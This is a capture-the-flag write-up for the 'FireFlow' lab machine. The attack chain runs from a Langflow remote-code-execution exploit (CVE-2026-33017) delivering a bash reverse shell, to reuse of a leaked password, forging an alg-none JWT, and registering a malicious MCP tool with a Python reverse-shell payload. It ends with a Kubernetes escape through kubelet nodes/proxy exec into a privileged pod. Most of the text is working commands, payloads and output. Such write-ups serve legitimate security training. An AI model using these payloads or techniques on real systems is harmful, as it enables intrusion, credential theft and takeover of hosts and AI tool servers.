
<img src="Images/logo%20fireflow.png" width="200" alt="logo fireflow">


# Attack Chain


# Summary

- [Enumeration](#enumeration)
- [Web](#web)
- [Shell as www-data - CVE-2026-33017](#shell-as-www-data---cve-2026-33017)
- [Lateral Movement](#lateral-movement)
	- [Craft admin JWT](#craft-admin-jwt)
	- [Shell as mcp](#shell-as-mcp)
- [Privilege Escalation](#privilege-escalation)

---
# Enumeration


```
nmap -sVC 10.129.86.122 -oA fireflow

PORT      STATE    SERVICE   VERSION
22/tcp    open     ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c4bd276ab10069205dcf755947f18df (ECDSA)
|_  256 2d6d4a4cee2e11b6c890e683e9df38b0 (ED25519)
443/tcp   open     ssl/http  nginx
| tls-alpn:
|   http/1.1
|   http/1.0
|_  http/0.9
|_http-title: FireFlow \xE2\x80\x94 Task Force Nightfall
| ssl-cert: Subject: commonName=fireflow.htb/organizationName=Task Force Nightfall/countryName=US
| Subject Alternative Name: DNS:fireflow.htb, DNS:*.fireflow.htb
| Not valid before: 2026-04-14T16:35:31
|_Not valid after:  2028-07-17T16:35:31
|_ssl-date: TLS randomness does not represent time
9100/tcp  filtered jetdirect
30000/tcp filtered ndmps
30718/tcp filtered unknown
30951/tcp filtered unknown
31038/tcp filtered unknown
31337/tcp filtered Elite
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


# Web

![default web](Images/default%20web.png)


![flow.fireflow](Images/flow.fireflow.png)

# Shell as www-data - CVE-2026-33017

https://github.com/advisories/GHSA-vwmf-pq79-vjvx

```
curl -sk -X POST "https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow" \
  -H "Content-Type: application/json" \
  -b "client_id=hacked" \
  -d '{
    "data": {
      "nodes": [{
        "id": "Exploit-001",
        "type": "genericNode",
        "position": {"x":0,"y":0},
        "data": {
          "id": "Exploit-001",
          "type": "ExploitComp",
          "node": {
            "template": {
              "code": {
                "type": "code",
                "required": true,
                "show": true,
                "multiline": true,
                "value": "import os, socket, json as _json\n\n_proof = os.system(\"bash -c '"'"'bash -i >& /dev/tcp/10.10.16.230/6767 0>&1'"'"'\").read().strip()\n_host = socket.gethostname()\n_write = open(\"/tmp/rce-proof\",\"w\").write(f\"{_proof} on {_host}\")\n\nfrom lfx.custom.custom_component.component import Component\nfrom lfx.io import Output\nfrom lfx.schema.data import Data\n\nclass ExploitComp(Component):\n    display_name=\"X\"\n    outputs=[Output(display_name=\"O\",name=\"o\",method=\"r\")]\n    def r(self)->Data:\n        return Data(data={})",
                "name": "code",
                "password": false,
                "advanced": false,
                "dynamic": false
              },
              "_type": "Component"
            },
            "description": "X",
            "base_classes": ["Data"],
            "display_name": "ExploitComp",
            "name": "ExploitComp",
            "frozen": false,
            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
            "field_order": ["code"],
            "beta": false,
            "edited": false
          }
        }
      }],
      "edges": []
    },
    "inputs": null
  }'
```


```
penelope -i tun0 -p 6767
[+] Listening for reverse shells on 10.10.16.230:6767
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => fireflow 10.129.86.122 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /root/.penelope/sessions/fireflow~10.129.86.122-Linux-x86_64/2026_08_25-15_23_12-806-www-data_33.log
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
www-data@fireflow:/var/lib/langflow$
```



```
www-data@fireflow:/etc/langflow$ cat .env
LANGFLOW_AUTO_LOGIN=False
LANGFLOW_SUPERUSER=langflow
LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll
LANGFLOW_SECRET_KEY=XgDCYma6JZzT3XXyePTbr4vgWrrZ4Vzz-PCQ4PXfKgE
LANGFLOW_CONFIG_DIR=/var/lib/langflow
LANGFLOW_LOG_LEVEL=warning
LANGFLOW_NEW_USER_IS_ACTIVE=False
LANGFLOW_CORS_ORIGINS=https://flow.fireflow.htb,https://fireflow.htb
```

```
ssh nightfall@10.129.86.122
nightfall@10.129.86.122's password: n1ghtm4r3_b4_n1ghtf4ll

nightfall@fireflow:~$
```


# Lateral Movement


```
nightfall@fireflow:~/.mcp$ cat config.json
{
  "server": "http://10.129.86.122:30080",
  "status_endpoint": "/api/v1/version",
  "user": "langflow-bot",
  "password": "Langfl0w@mcp2026!"
}
```



```
nightfall@fireflow:~/.mcp$ curl -s http://127.0.0.1:30080/api/v1/version | python3 -m json.tool
{
    "service": "MCP AI Tool Registry",
    "version": "0.1.0",
    "auth": {
        "type": "JWT",
        "header": "Authorization: Bearer <token>",
        "supported_algorithms": [
            "HS256",
            "none"
        ]
    },
    "docs": "/docs",
    "endpoints": [
        "POST /mcp                        [MCP JSON-RPC 2.0]",
        "POST /api/v1/auth",
        "GET  /api/v1/tools",
        "POST /api/v1/tools               [admin]"
    ]
}
```


```
nightfall@fireflow:~/.mcp$ curl -s -X POST http://127.0.0.1:30080/api/v1/auth -d '{"username":"langflow-bot","password":"Langfl0w@mcp2026!"}' -H 'Content-Type: application/json'
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJsYW5nZmxvdy1ib3QiLCJyb2xlIjoidXNlciJ9.RenGdHutrKPCOWjwYSJex8C_uMSmy7I8AMkhmTwf9Ps","token_type":"bearer"}
```

### Craft admin JWT

![xjwt modification fireflow](Images/xjwt%20modification%20fireflow.png)

We change the `alg` to `none` and `role` to `admin` then we click on **Generate Token**.

### Shell as mcp

```
curl -s -X POST http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: application/json' -H "Authorization: Bearer $ADMIN_JWT" -d '{
  "name":"shell",
  "description":"debug shell",
  "inputSchema":{"type":"object","properties":{}},
  "code":"import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(1)\ns=socket.socket()\ns.connect((\"10.10.16.230\",6767))\n[os.dup2(s.fileno(),i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")"
}'
{"status":"registered","name":"shell"}
```

```
curl -s -X POST http://127.0.0.1:30080/mcp \
-H 'Content-Type: application/json' \
-H "Authorization: Bearer $ADMIN_JWT" \
-d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'
```

```
penelope -i tun0 -p 6767

mcp@mcp-server-54464cb475-29ztf:/app$
```

# Privilege Escalation

We notice that kubernetes is running inside the container.

```
mcp@mcp-server-54464cb475-29ztf:/var/run/secrets/kubernetes.io/serviceaccount$ ls
ca.crt  namespace  token
```

Looking at the environment variable, we discovered the API of kubernetes and we can interact with it.

```
mcp@mcp-server-54464cb475-29ztf:/var/run/secrets/kubernetes.io/serviceaccount$ env

<SNIP>

MCP_SERVER_PORT_8080_TCP_PORT=8080
MCP_SERVER_PORT_8080_TCP_ADDR=10.43.250.195
TERM=xterm-256color
SHLVL=1
MCP_SERVER_PORT=tcp://10.43.250.195:8080
KUBERNETES_PORT_443_TCP_PROTO=tcp
MCP_SERVER_SERVICE_PORT_HTTP=8080
KUBERNETES_PORT_443_TCP_ADDR=10.43.0.1
MCP_SERVER_PORT_8080_TCP=tcp://10.43.250.195:8080
KUBERNETES_SERVICE_HOST=10.43.0.1
KUBERNETES_PORT=tcp://10.43.0.1:443
KUBERNETES_PORT_443_TCP_PORT=443
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_=/usr/bin/env
OLDPWD=/var/run/secrets/kubernetes.io
```

Let's craft our variables.

```
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
API=https://10.43.0.1:443
```

And now we can look at our permissions.

```
curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
-H "Authorization: Bearer $TOKEN" \
-H "Content-Type: application/json" \
-d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}' \
| python3 -m json.tool
{
    "kind": "SelfSubjectRulesReview",
    "apiVersion": "authorization.k8s.io/v1",
    "metadata": {},
    "spec": {},
    "status": {
        "resourceRules": [
            {
                "verbs": [
                    "get"
                ],
                "apiGroups": [
                    ""
                ],
                "resources": [
                    "nodes/proxy"
                ]
<SNIP>
```


With `nodes/proxy` access, we can execute commands in ANY container on the node, even if the pod doesn’t have the right permissions

Now we need to find a privileged pod.

```
mcp@mcp-server-54464cb475-29ztf:/var/run/secrets/kubernetes.io/serviceaccount$ curl -sk "https://10.129.86.122:10250/pods" -H "Authorization: Bearer $TOKEN" \
| python3 -c "
import sys,json
data=json.load(sys.stdin)
for item in data['items']:
    ns=item['metadata']['namespace']
    name=item['metadata']['name']
    vols=[v for v in item['spec'].get('volumes',[]) if 'hostPath' in v]
    for c in item['spec']['containers']:
        if c.get('securityContext',{}).get('privileged') and vols:
            paths=[v['hostPath']['path'] for v in vols]
            print(f'[!] PRIVILEGED: {ns}/{name} - container: {c[\"name\"]} - hostPaths: {paths}')
"
[!] PRIVILEGED: monitoring/prometheus-prometheus-node-exporter-nmntq - container: node-exporter - hostPaths: ['/proc', '/sys', '/']
```

We found one, we can now craft a script that will allow us to execute commands over the pod to escape it.

```
mcp@mcp-server-54464cb475-29ztf:/tmp$ cat > /tmp/kube_exec.py << 'EOF'
#!/usr/bin/env python3
import asyncio, ssl, sys, websockets

NODE = "10.129.86.122"
NE_NS = "monitoring"
NE_POD = "prometheus-prometheus-node-exporter-nmntq"
NE_CNT = "node-exporter"
TOKEN = open('/var/run/secrets/kubernetes.io/serviceaccount/token').read().strip()
COMMAND = sys.argv[1] if len(sys.argv) > 1 else 'id'

async def ws_exec(cmd_parts):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    args = "&".join(f"command={part}" for part in cmd_parts)
    url = (f"wss://{NODE}:10250/exec/{NE_NS}/{NE_POD}/{NE_CNT}"
           f"?output=1&error=1&{args}")
    async with websockets.connect(
        url, ssl=ctx,
        additional_headers={"Authorization": f"Bearer {TOKEN}"},
        subprotocols=["v4.channel.k8s.io"],
        open_timeout=10
    ) as ws:
        try:
            while True:
                data = await asyncio.wait_for(ws.recv(), timeout=5)
                if isinstance(data, bytes) and len(data) > 1:
                    sys.stdout.write(data[1:].decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
            pass

asyncio.run(ws_exec(COMMAND.split()))
EOF
```

**Script Explanation:**

1. **WebSocket Connection:** The kubelet uses WebSockets for exec commands
2. **SSL Configuration:** We ignore certificate validation (self-signed)
3. **URL Construction:**
    - `wss://{NODE}:10250/exec/{namespace}/{pod}/{container}`
    - With query parameters for the command
4. **Authentication:** We use our service account token in the header
5. **Output Reading:** The kubelet sends multiplexed streams (stdout, stderr)

The root flag was then retrieved.

```
mcp@mcp-server-54464cb475-29ztf:/tmp$ python3 /tmp/kube_exec.py "cat /host/root/root/root.txt"
099860c96da11d80e84cdfe413d71226
{"metadata":{},"status":"Success"}
```

> [!TIP]
> **Machine rooted**



